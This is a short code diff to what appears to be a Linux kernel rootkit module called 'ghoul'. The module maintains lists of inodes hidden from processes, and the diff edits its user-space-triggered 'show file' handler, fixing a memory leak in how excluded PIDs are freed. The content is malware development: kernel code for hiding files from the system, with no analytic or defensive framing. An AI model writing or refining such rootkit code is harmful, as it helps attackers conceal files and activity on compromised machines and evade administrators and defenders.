@@ -79,8 +79,8 @@ int should_hide_inode(unsigned long ino)
 void show_file_inode(const void __user *user_info)
 {
     struct show_file_inode_info info;
-    struct inode_list *entry, *hidden_inode = NULL;
-    struct pid_list *excluded_pid;
+    struct inode_list *inode_entry, *hidden_inode = NULL;
+    struct pid_list *excluded_pid, *temp;
 
     // copy request info
     if (copy_from_user((void *)&info, user_info, sizeof(struct show_file_inode_info))) {
@@ -89,9 +89,9 @@ void show_file_inode(const void __user *user_info)
     }
 
     // search for requested inode
-    list_for_each_entry(entry, &hidden_inodes, list) {
-        if (entry->ino == info.ino)
-            hidden_inode = entry;
+    list_for_each_entry(inode_entry, &hidden_inodes, list) {
+        if (inode_entry->ino == info.ino)
+            hidden_inode = inode_entry;
     }
 
     // requested inode is not hidden
@@ -101,6 +101,16 @@ void show_file_inode(const void __user *user_info)
     // show inode to all PIDs - delete from hidden inodes list
     if (info.pid == ALL_PIDS) {
         pr_info("ghoul: showing inode %lu for all processes\n", info.ino);
+
+        // free all excluded PIDs first
+        if (!list_empty(&hidden_inode->excluded_pids)) {
+            list_for_each_entry_safe(excluded_pid, temp, &hidden_inode->excluded_pids, list) {
+                list_del(&excluded_pid->list);
+                kfree(excluded_pid);
+            }
+        }
+
+        // remove and free hidden inode
         list_del(&hidden_inode->list);
         kfree(hidden_inode);
         return;
